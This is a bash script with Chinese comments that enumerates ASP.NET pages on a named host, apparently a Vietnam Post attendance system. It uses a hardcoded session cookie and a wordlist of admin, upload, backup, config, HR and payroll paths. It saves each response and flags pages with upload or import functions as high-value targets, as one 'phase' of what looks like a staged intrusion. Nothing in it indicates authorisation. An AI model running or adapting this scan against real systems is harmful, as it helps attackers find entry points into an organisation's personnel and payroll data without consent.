#!/bin/bash

COOKIE="ASP.NET_SessionId=bezu1wgtbs241i4cyhxapaou"
BASE="http://vps.vnpost.vn/chamcong"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥🔥🔥 Phase 3: 深度.aspx文件枚举"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 生成完整.aspx字典
cat > aspx_wordlist.txt << 'ASPXLIST'
admin.aspx
admin/default.aspx
admin/index.aspx
admin/login.aspx
upload.aspx
fileupload.aspx
Upload.aspx
FileUpload.aspx
import.aspx
Import.aspx
export.aspx
Export.aspx
backup.aspx
Backup.aspx
download.aspx
Download.aspx
manage.aspx
Manage.aspx
manager.aspx
config.aspx
Config.aspx
settings.aspx
Settings.aspx
test.aspx
Test.aspx
debug.aspx
Debug.aspx
default.aspx
Default.aspx
api.aspx
API.aspx
service.aspx
webservice.aspx
report/default.aspx
report/index.aspx
report/admin.aspx
report/Upload.aspx
common/upload.aspx
common/fileupload.aspx
admin/Upload.aspx
admin/FileUpload.aspx
admin/Import.aspx
system/admin.aspx
system/config.aspx
nhansu/default.aspx
nhansu/admin.aspx
luong/default.aspx
luong/admin.aspx
baocao/default.aspx
baocao/admin.aspx
TaoB CC.aspx
TaoBCC.aspx
UploadFile.aspx
ImportData.aspx
ExportData.aspx
UserManage.aspx
AdminPanel.aspx
SystemConfig.aspx
DatabaseBackup.aspx
ASPXLIST

echo "[*] 枚举 $(wc -l < aspx_wordlist.txt) 个.aspx文件..."

found_count=0

while read aspx; do
    echo -n "  /${aspx}: "
    
    resp=$(curl -sk "${BASE}/${aspx}" \
        -H "Cookie: $COOKIE" \
        -w "%{http_code}" \
        -o "aspx_$(echo $aspx | tr '/' '_').html" 2>&1)
    
    http_code=$(echo "$resp" | tail -1)
    size=$(wc -c < "aspx_$(echo $aspx | tr '/' '_').html")
    
    case $http_code in
        200)
            if [ $size -gt 1000 ]; then
                echo "✅ 200 ($size bytes) 🔥"
                echo "$aspx|200|$size" >> found_aspx_200.txt
                ((found_count++))
                
                # 检查是否包含关键词
                if grep -qi "upload\|file\|import" "aspx_$(echo $aspx | tr '/' '_').html"; then
                    echo "    🔥🔥🔥 包含上传/导入功能!"
                    echo "$aspx" >> high_value_aspx.txt
                fi
            else
                echo "200 ($size bytes)"
            fi
            ;;
        302|301)
            echo "⚠️  $http_code (重定向)"
            echo "$aspx|$http_code|redirect" >> found_aspx_redirect.txt
            ;;
        403)
            echo "⚠️  403 (禁止访问 - 可能存在但需权限)"
            echo "$aspx|403|forbidden" >> found_aspx_403.txt
            ;;
        401)
            echo "⚠️  401 (需要认证)"
            echo "$aspx|401|auth" >> found_aspx_401.txt
            ;;
        404)
            echo "- 404"
            ;;
        500)
            echo "⚠️  500 (服务器错误 - 可能存在但有bug)"
            echo "$aspx|500|error" >> found_aspx_500.txt
            ;;
        *)
            echo "⚠️  $http_code"
            ;;
    esac
    
    sleep 0.3
done < aspx_wordlist.txt

echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "📊 枚举结果:"
echo "  200 OK: $(wc -l < found_aspx_200.txt 2>/dev/null || echo 0)"
echo "  403 Forbidden: $(wc -l < found_aspx_403.txt 2>/dev/null || echo 0)"
echo "  401 Auth: $(wc -l < found_aspx_401.txt 2>/dev/null || echo 0)"
echo "  500 Error: $(wc -l < found_aspx_500.txt 2>/dev/null || echo 0)"
echo "  重定向: $(wc -l < found_aspx_redirect.txt 2>/dev/null || echo 0)"
echo ""
echo "🔥 高价值发现:"
cat high_value_aspx.txt 2>/dev/null || echo "  无"
echo ""
echo "📄 所有200页面:"
cat found_aspx_200.txt 2>/dev/null || echo "  无"
